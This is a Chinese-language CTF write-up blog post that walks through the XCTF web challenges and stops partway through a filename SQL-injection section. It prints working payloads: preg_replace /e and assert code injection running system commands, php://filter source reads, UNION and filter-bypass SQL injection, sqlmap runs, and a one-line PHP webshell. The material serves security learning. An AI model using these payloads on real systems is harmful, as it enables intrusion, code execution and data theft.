
<!DOCTYPE html>
<html lang class="loading">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>攻防世界 — Web进阶题(第1-10关) - Knlvre</title>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate">
    <meta name="keywords" content="TriDiamond Obsidian,"> 
    <meta name="description" content="Cat进入题目后给出一个输入框，输入IP地址后会返回PING的信息

此时想到了命令执行，但是尝试127.0.0.1 &amp;amp; ls、127.0.0.1 &amp;amp;&amp;amp; ls、127.0.0,"> 
    <meta name="author" content="Knlvre"> 
    <link rel="alternative" href="atom.xml" title="Knlvre" type="application/atom+xml"> 
    <link rel="icon" href="/knlvre.github.io/img/favicon.png"> 
    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
    <link rel="stylesheet" href="/knlvre.github.io/css/obsidian.css">
    <link rel="stylesheet" href="/knlvre.github.io/css/ball-atom.min.css">
</head>
</html>

<body class="loading">
    <div class="loader">
        <div class="la-ball-atom la-2x">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
        </div>
    </div>
    <span id="config-title" style="display:none">Knlvre</span>
    <div id="loader"></div>
    <div id="single">
    <div class="scrollbar gradient-bg-rev"></div>
<div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <div class="navigation animated fadeIn fast delay-1s">
        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="https://knlvre.github.io">
        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
        <h3 class="subtitle">攻防世界 — Web进阶题(第1-10关)</h3>
        <div class="social">
            <!--        <div class="like-icon">-->
            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
            <!--        </div>-->
            <div>
                <div class="share">
                    
                        <a href="javascript:;" class="iconfont icon-share1"></a>
                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
                    
                </div>
            </div>
        </div>
    </div>
</div>

    <div class="section">
        <div class=article-header-wrapper>
    <div class="article-header">
        <div class="article-cover animated fadeIn" style="
            animation-delay: 600ms;
            animation-duration: 1.2s;
            background-image: 
                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
                url(/img/cover.jpg);">
        </div>
        <div class="else">
            <p class="animated fadeInDown">
                
                <a href="javascript:;"><b>「 </b>Article<b> 」</b></a>
                
                September 05, 2019
            </p>
            <h3 class="post-title animated fadeInDown"><a href="/knlvre.github.io/2019/09/05/攻防世界 — Web进阶题（1-10）/" title="攻防世界 — Web进阶题(第1-10关)">攻防世界 — Web进阶题(第1-10关)</a>
            </h3>
            
            <p class="post-count animated fadeInDown">
                
                <span>
                    <b class="iconfont icon-text2"></b> <i>Words count</i>
                    32k
                </span>
                
                
                <span>
                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
                    29 mins.
                </span>
                
                
                
                <span id="busuanzi_container_page_pv">
                    <b class="iconfont icon-read"></b> <i>Read count</i>
                    <span id="busuanzi_value_page_pv">0</span>
                </span>
                
            </p>
            
            
            <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/knlvre.github.io/tags/CTF-Web/">CTF-Web</a></li></ul>
            
        </div>
    </div>
</div>

<div class="screen-gradient-after">
    <div class="screen-gradient-content">
        <div class="screen-gradient-content-inside">
            <div class="bold-underline-links screen-gradient-sponsor">
                <p>
                    <span class="animated fadeIn delay-1s"></span>
                </p>
            </div>
        </div>
    </div>
</div>

<div class="article">
    <div class='main'>
        <div class="content markdown animated fadeIn">
            <h2 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h2><p>进入题目后给出一个输入框，输入<code>IP地址</code>后会返回<code>PING</code>的信息</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/1-1.png" alt="1-1"></p>
<p>此时想到了<code>命令执行</code>，但是尝试<code>127.0.0.1 &amp; ls</code>、<code>127.0.0.1 &amp;&amp; ls</code>、<code>127.0.0.1 | ls</code>都会显示<code>Invalid URL</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/1-2.png" alt="1-2"></p>
<p>网站用的是php写的，但是这个Cloud端就不一定是php的了。</p>
<p>在URL的传参处<code>?url=</code>这里，我们传递个<code>%79</code>发现传递之后变成了<code>?url=y</code>，看来是可以传递url编码，系统会接受并进行解析</p>
<p>于是我们传递<code>%80</code>会出现报错，url编码使用的是16进制，80也就是128，ASCII码是从0-127，所以这个时候会报错。</p>
<p>url编码表可以参考：<a href="http://www.w3school.com.cn/tags/html_ref_urlencode.html" target="_blank" rel="noopener">http://www.w3school.com.cn/tags/html_ref_urlencode.html</a></p>
<p>报错信息中可以看到：</p>
<pre><code>UnicodeEncodeError at /api/ping
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/1-3.png" alt="1-3"></p>
<p>这说明Cloud端使用的是<code>Python的Django框架</code></p>
<p>看一下官方的文档</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/1-4.png" alt="1-4"></p>
<p>所以根据Django的目录，我们使用@进行文件传递，对文件进行读取之后还会把内容传给url参数，如果像上面一样有超出解析范围的编码的时候就会得到错误信息。</p>
<p>我们的目标首先是数据库文件，看从错误信息中能不能拿到flag，可以从配置文件settings.py的报错中看看有没有database的相关信息</p>
<pre><code>?url=@/opt/api/api/setting.py
</code></pre><p>搜索关键词<code>database</code>之后，看到两处关键点：</p>
<pre><code>os.path.join(BASE_DIR, \\\&amp;#39;database.sqlite3\\\&amp;#39;)

&amp;#39;/opt/api/database.sqlite3&amp;#39
</code></pre><p>现在去访问这个<code>/opt/api/database.sqlite3</code></p>
<pre><code>?url=@/opt/api/database.sqlite3
</code></pre><p>搜索关键词<code>ctf</code>，找到了flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/1-5.png" alt="1-5"></p>
<p>参考文章：<a href="https://blog.csdn.net/zz_Caleb/article/details/95041031" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/article/details/95041031</a></p>
<h2 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h2><p>题目描述： 其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统</p>
<p>题目进去之后，只有左边栏中的<code>设备维护中心</code>可以点击，进入页面后点击左上角的<code>云平台设备维护中心</code>，就可以在URL中看到提交了<code>page</code>参数</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/2-1.png" alt="2-1"></p>
<p>尝试伪协议读取<code>index.php</code></p>
<pre><code>?page=php://filter/read/convert.base64-encode/resource=index.php
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/2-2.png" alt="2-2"></p>
<p>base64解码后拿到index.php的源代码，下面给出关键部分</p>
<pre><code class="php">if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] === &#39;127.0.0.1&#39;) {

    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;

    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[sub];

    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
    }else{
        die();
    }

}
</code></pre>
<p>可以看到使用了<code>preg_replace()</code>函数，这个函数是有漏洞的：</p>
<blockquote>
<p> /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码</p>
</blockquote>
<p>我们直接上<code>system()</code>函数（记得添加X-Forwarded-For字段）</p>
<pre><code>?pat=/knlvre/e&amp;rep=system(&#39;ls&#39;)&amp;sub=knlvre
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/2-3.png" alt="2-3"></p>
<p>直接可以列出当前目录下的详情，我们直接浏览器访问<code>s3chahahaDir</code>目录，在其下面还发现了<code>flag</code>目录，里面有<code>flag.php</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/2-4.png" alt="2-4"></p>
<p>还是用前面的伪协议读取就可以了</p>
<pre><code>?page=php://filter/read/convert.base64-encode/resource=s3chahahaDir/flag/flag.php
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/2-5.png" alt="2-5"></p>
<p>解密后得到flag</p>
<h2 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h2><p>进入该题后，需要先注册一个用户，用户名随意，然后就拥有<code>20块钱</code>。来到<code>Buy</code>页面，输入7个数字，只要猜中数字就能获得对应的报酬（这显然太慢了）</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/5-2.png" alt="5-2"></p>
<p>转了几圈没有思路，开始扫目录，发现<code>git</code>源码泄露</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/5-1.png" alt="5-1"></p>
<p><code>GitHack</code>下载源码，查看<code>buy.php</code>，将输入的数字提交到 buy.js</p>
<pre><code>&lt;form method=&quot;POST&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;numbers&quot; id=&quot;numbers&quot; minlength=&quot;7&quot; maxlength=&quot;7&quot; pattern=&quot;\d{7}&quot; required placeholder=&quot;7 numbers&quot;&gt;&lt;button type=&quot;button&quot; id=&quot;btnBuy&quot;&gt;Buy!&lt;/button&gt;&lt;/form&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;js/buy.js&quot;&gt;&lt;/script&gt;
</code></pre><p>查看<code>buy.js</code>，它将我们提交的<code>numbers</code>又通过<code>POST</code>提交给了 api.php</p>
<pre><code>function buy(){    $(&#39;#wait&#39;).show();    $(&#39;#result&#39;).hide();    var input = $(&#39;#numbers&#39;)[0];    if(input.validity.valid){        var numbers = input.value;        $.ajax({          method: &quot;POST&quot;,          url: &quot;api.php&quot;,          dataType: &quot;json&quot;,          contentType: &quot;application/json&quot;,           data: JSON.stringify({ action: &quot;buy&quot;, numbers: numbers })        }).done(function(resp){            if(resp.status == &#39;ok&#39;){                show_result(resp);            } else {                alert(resp.msg);            }        })    } else {        alert(&#39;invalid&#39;);    }    $(&#39;#wait&#39;).hide();}
</code></pre><p>查看<code>api.php</code>，从代码中可以看出来，“彩票结果”是变量<code>$win_numbers</code>，通过<code>random_num()</code>、<code>random_win_nums()</code>共同生成</p>
<pre><code>switch ($data[&#39;action&#39;]) {    case &#39;buy&#39;:        require_keys($data, [&#39;numbers&#39;]);        buy($data);        break;...    default:        response_error(&#39;invalid request&#39;);        break;}function random_num(){    do {        $byte = openssl_random_pseudo_bytes(10, $cstrong);        $num = ord($byte);    } while ($num &gt;= 250);    if(!$cstrong){        response_error(&#39;server need be checked, tell admin&#39;);    }        $num /= 25;    return strval(floor($num));}function random_win_nums(){    $result = &#39;&#39;;    for($i=0; $i&lt;7; $i++){        $result .= random_num();    }    return $result;}function buy($req){    require_registered();    require_min_money(2);    $money = $_SESSION[&#39;money&#39;];    $numbers = $req[&#39;numbers&#39;];    $win_numbers = random_win_nums();    $same_count = 0;    for($i=0; $i&lt;7; $i++){        if($numbers[$i] == $win_numbers[$i]){            $same_count++;        }    }    switch ($same_count) {        case 2:            $prize = 5;            break;        case 3:            $prize = 20;            break;        case 4:            $prize = 300;            break;        case 5:            $prize = 1800;            break;        case 6:            $prize = 200000;            break;        case 7:            $prize = 5000000;            break;        default:            $prize = 0;            break;    }    $money += $prize - 2;    $_SESSION[&#39;money&#39;] = $money;    response([&#39;status&#39;=&gt;&#39;ok&#39;,&#39;numbers&#39;=&gt;$numbers, &#39;win_numbers&#39;=&gt;$win_numbers, &#39;money&#39;=&gt;$money, &#39;prize&#39;=&gt;$prize]);}
</code></pre><p>我们可以测试一下，看生成结果的类型：<code>string</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/5-3.png" alt="5-3"></p>
<p><code>$numbers（我们要POST的参数）</code>和<code>$win_numbers（系统生成结果）</code>通过<code>弱类型（==）</code>进行比较</p>
<p>查看php官方的类型比较表</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/5-4.png" alt="5-4"></p>
<p>刚好我们要POST的格式为<code>JSON</code>，而 JSON 支持布尔类型的参数，payload如下</p>
<blockquote>
<p>默认提交的 numbers 字段为字符串，由于我们此处提交的不是字符串，所以要记得修改格式为 []</p>
<p>不知道为什么，我这里提交 7 个 true 只能得到 1800 。多加几个 true 才能拿到 5000000</p>
</blockquote>
<pre><code>{&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true,true,true,true,true]}
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/5-5.png" alt="5-5"></p>
<p>有钱之后，买下flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/5-6.png" alt="5-6"></p>
<h2 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h2><p>题目描述：如题目环境报错，稍等片刻刷新即可</p>
<p>连接进去之后看到一个搜索框架，第一时间想到：Sql、XSS、XXE</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/3-1.png" alt="3-1"></p>
<p>①方法一</p>
<p>现在输入框输入测试数值：<code>123</code>，抓包看一下。首先尝试Sql注入，很快就发现参数<code>单引号</code>包裹，列数为<code>3</code>，没有任何过滤，正常注入就行</p>
<pre><code>[+]注表名：search=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #
返回：news,secret_table

[+]注列名：search=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;secret_table&quot; #
返回：id,fl4g

[+]注数据：search=-1&#39; union select 1,2,fl4g from secret_table #
返回：QCTF{sq1_inJec7ion_ezzz}
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/3-2.png" alt="3-2"></p>
<p>②方法二</p>
<p>在网上看到其他大佬的WriteUp，使用Sqlmap来自动完成的，深感工具的魅力，平时都是手动注入，现在将本题利用Sqlmap的过程记录下来</p>
<p>首先还是需要抓取请求，然后将<code>请求</code>复制下来，放进Sqlmap文件夹内的一个<code>txt（本题是模板.txt）</code>里</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/3-3.png" alt="3-3"></p>
<p>然后开始用<code>Python2</code>跑Sqlmap，命令及结果如下</p>
<pre><code>python2 sqlmap.py -r 模板.txt --dbs
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/3-4.png" alt="3-4"></p>
<pre><code>python2 sqlmap.py -r 模板.txt -D news --tables
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/3-5.png" alt="3-5"></p>
<pre><code>python2 sqlmap.py -r 模板.txt -D news -T secret_table --dump
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/3-6.png" alt="3-6"></p>
<p>参考文章：<a href="https://blog.csdn.net/yangker12148/article/details/90635554" target="_blank" rel="noopener">https://blog.csdn.net/yangker12148/article/details/90635554</a></p>
<h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h2><p>链接进去之后只有<code>Home</code>、<code>About</code>、<code>Contact</code>可以点击，对应的url传递的<code>page</code>参数也随之改变</p>
<p>没有任何输入点，直接用Github上的工具<code>Dirsearch</code>扫一下，发现了<code>.git</code>文件</p>
<pre><code>python dirsearch.py -u http://111.198.29.45:59852/?page=home -e php
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/4-1.png" alt="4-1"></p>
<p>用GitHub上的工具<code>Githack</code>去下载源码</p>
<pre><code>python2 GitHack.py http://111.198.29.45:59852/.git
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/4-2.png" alt="4-2"></p>
<p>首先去查看了<code>templates</code>目录，发现里面有<code>flag.php</code>，但是没有有用的东西。只能退后去看index.php，发现了漏洞点</p>
<p>关键代码：</p>
<pre><code class="php">&lt;?php

if (isset($_GET[&#39;page&#39;])) {
    $page = $_GET[&#39;page&#39;];
} else {
    $page = &quot;home&quot;;
}

$file = &quot;templates/&quot; . $page . &quot;.php&quot;;

// I heard &#39;..&#39; is dangerous!
assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);

// TODO: Make this look nice
assert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);

?&gt;
</code></pre>
<p>assert为断言函数，会将括号内的表达式当做函数去执行，当返回结果为<code>True</code>时，就不会执行<code>die函数</code>。题目直接下载源码无法看到flag，但是<code>flag.php</code>存在必定要利用，所以这里通过<code>assert()函数</code>来执行<code>cat命令</code>，去查看<code>flag.php</code></p>
<p>payload：</p>
<pre><code>?page=what_ever&#39;) or system(&#39;cat templates/flag.php&#39;) //
</code></pre><p>闭合掉前面的<code>(&#39;</code>就可以，不管前面函数的执行结果，加了<code>or</code>保证让<code>assert()函数</code>执行的结果为<code>True</code></p>
<p>请求后返回空白，右键查看源代码，就看到了flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/4-3.png" alt="4-3"></p>
<p>参考文章：<a href="https://www.jianshu.com/p/795f918d791b" target="_blank" rel="noopener">https://www.jianshu.com/p/795f918d791b</a></p>
<h2 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h2><p>题目进去之后看到如下提示</p>
<blockquote>
<p>In this little training challenge, you are going to learn about the <a href="http://en.wikipedia.org/wiki/Robots_exclusion_standard" target="_blank" rel="noopener">Robots_exclusion_standard</a>.<br>The robots.txt file is used by web crawlers to check if they are allowed to crawl and index your website or only parts of it.<br>Sometimes these files reveal the directory structure instead protecting the content from being crawled.</p>
<p> Enjoy!  </p>
</blockquote>
<p>访问<code>robots.txt</code>，内容如下</p>
<pre><code>User-agent: *
Disallow: /fl0g.php


User-agent: Yandex
Disallow: *
</code></pre><p>访问<code>fl0g.php</code>，直接拿到flag</p>
<h2 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h2><p>进入题目，可选动作有<code>login</code>、<code>Register</code>、<code>Findpwd</code></p>
<p>第一时间想到的是<code>Findwd</code>功能可能会有漏洞，先注册用户</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-1.png" alt="6-1"></p>
<p>拿着刚注册的用户去重置密码，抓包查看参数。注意到其中有<code>step</code>参数</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-2.png" alt="6-2"></p>
<p>然后就直接一个提交新密码的框</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-3.png" alt="6-3"></p>
<p>提交新密码，抓包查看。提交用户名和新密码账号，直接就修改成功</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-4.png" alt="6-4"></p>
<p>有戏，将用户名换成<code>admin</code>，同样修改成功</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-5.png" alt="6-5"></p>
<p>用 admin 登录，进入界面，其他按钮都可以点击唯独点击<code>Manage</code>会提示：<code>IP Not allowed</code>，试着添加<code>X-Forwarded-For: 127.0.0.1</code>，进入成功</p>
<p>没有flag，但是有了提示</p>
<blockquote>
<p>Where Is The Flag?</p>
<p>index.php?module=filemanage&amp;do=???</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-6.png" alt="6-6"></p>
<p>尝试了一些常见的系统命令无果，仔细看提示里的<code>filemanage</code>，试一下<code>upload</code>，出现了可以上传的页面</p>
<pre><code>?module=filemanage&amp;do=upload
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-7.png" alt="6-7"></p>
<p>上传<code>php</code>提示：<code>It is a php</code>。上传文件后缀名为<code>png</code>，抓包修改为<code>php</code>还是出现同样提示。在文件内容前加上<code>GIF89a</code>还是同样提示</p>
<p>修改后缀名为<code>php5</code>，修改文件内容为</p>
<pre><code>&lt;script language=&#39;php&#39;&gt;system($_GET[&#39;pass&#39;]);&lt;script&gt;
</code></pre><p>上传成功，拿下flag</p>
<blockquote>
<p>所以本题应该是采用 黑名单 + 检测文件内容&lt;?php 的方式</p>
</blockquote>
<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>进入题目后需要先注册，然后拿着注册的用户去登录，进入到上传页面。刚开始尝试了<code>php</code>、<code>png</code>、<code>gif</code>都提示：<code>Incorrect file extension!</code>，最后发现只有<code>jpg</code>后缀可以上传，上传成功之后，会显示我们上传的所有文件</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-1.png" alt="7-1"></p>
<p>没有思路，看了别人的WriteUp才知道是<code>文件名注入</code></p>
<p>我们上传文件，页面将我们上传的文件名返回，应该是查询了数据库。首先验证对参数的拼接，上传三个文件名</p>
<pre><code>s&quot; or 1=1 --+.jpg
s&#39; or 1=1 --+.jpg
s or 1=1 --+.jpg
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-2.png" alt="7-2"></p>
<p>其中只有带<code>单引号</code>的没有返回，说明发生了构造，查询结果出乎服务器的预料。确认是单引号之后，就可以开始测试注语句</p>
<blockquote>
<p>测试的时候发现，必须要用 加号（+） 连接前后，如下：</p>
<p>s’+(要执行的语句)+’</p>
<p>除了要执行的语句以外，前后两部分是为了闭合单引号，也必须要用 加号 连接，否则语句会出错，导致无法回显内容</p>
</blockquote>
<pre><code>s&#39;+(select database())+&#39;.jpg
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-3.png" alt="7-3"></p>
<p><code>select</code>被过滤掉了，尝试双写绕过成功</p>
<pre><code>s&#39;+(seselectlect database())+&#39;.jpg
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-4.png" alt="7-4"></p>
<p>但是会发现返回的结果为<code>0</code>，后来发现<code>select database()</code>的结果被系统设置为0</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-5.png" alt="7-5"></p>
<p>执行常规注入表名的语句返回结果也是0，并且发现<code>from</code>也被过滤</p>
<pre><code>s&#39;+(selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())+&#39;.jpg
</code></pre><p>怀疑是否对返回的结果进行过滤（即检测为英文字母就过滤掉并返回0），所以尝试将返回结果进行转换</p>
<pre><code>s&#39;+(selselectect hex(database()))+&#39;.jpg
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-6.png" alt="7-6"></p>
<p>果然将结果处理为十六进制就能返回，将<code>十六进制转换为ASCII</code>，得到<code>web</code></p>
<pre><code class="python">s = &quot;7765625&quot;
hex_list = []
con_list = []
ascii_list = []
flag = &quot;&quot;

for i in range(0,len(s),2):
    if(len(s[i:i+2])==2):
        hex_list.append(s[i:i+2])

for i in hex_list:
    con_list.append(int(i,16))

for i in con_list:
    flag = flag + chr(i)

print(flag)        #输出web
</code></pre>
<p>得到数据库名称之后，注表名</p>
<pre><code>s&#39;+(selselectect hex(group_concat(table_name) frfromom information_schema.tables where table_schema=database()))+&#39;.jpg
</code></pre><p>成功提交后，刷新页面居然没有任何回显，现在开始怀疑是不是将我们转换为十六进制后的字母也过滤掉了</p>
<p>试着将结果在转换为十进制（使用CONV()函数）</p>
<blockquote>
<p>CONV()函数用法：</p>
<p>CONV(要转换的字符串，要转换的进制，转换后的进制)</p>
</blockquote>
<p>还是继续拿注数据库的语句进行尝试</p>
<pre><code>s&#39;+(selselectect CONV(hex(database()),16,10))+&#39;.jpg
</code></pre><p>发现返回一个科学计数法的数字</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-7.png" alt="7-7"></p>
<p>想了一下，觉得是因为<code>数据库名</code>转换为<code>十六进制</code>对应的是两位两位（比如 web -&gt; 77 65 62），而CONV函数将十六进制整串转化为<code>十进制</code>，那这个数就非常大并且只能用科学技术法标识。想到了一个解决办法：<code>将十六进制的内容分段传给CONV函数能以十进制正常返回的范围</code>，这时候就需要借用到<code>substr()</code>函数，后来尝试最大只能是<code>12</code>位，开始注入：</p>
<p><strong>注数据库</strong></p>
<pre><code>s&#39;+(selselectect CONV(substr(hex(database()),1,12),16,10))+&#39;.jpg

#返回 131277325825392
</code></pre><p>果然回显成功</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-8.png" alt="7-8"></p>
<p>第二部分（返回没有第一次长，应该是结束了）</p>
<pre><code>s&#39;+(selselectect CONV(substr(hex(database()),13,12),16,10))+&#39;.jpg

#返回 1819238756
</code></pre><p>将两次返回的结果分别转换为ASCII</p>
<pre><code class="python">s = [131277325825392,1819238756]

for i in range(len(s)):
    s[i] = hex(s[i])[2:]

hex_list = []
con_list = []
flag = &quot;&quot;

for i in s:
    for j in range(0,len(i),2):
        hex_list.append(i[j:j+2])

for i in hex_list:
    con_list.append(int(i,16))

for i in con_list:
    flag = flag + chr(i)

print(flag)        #输出 web_upload
</code></pre>
<p><strong>注表名</strong></p>
<pre><code>s&#39;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),1,12),16,10))+&#39;.jpg
#返回 112602976187180

s&#39;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),13,12),16,10))+&#39;.jpg
#返回 114784820031327

s&#39;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),25,12),16,10))+&#39;.jpg
#返回 112615676665705

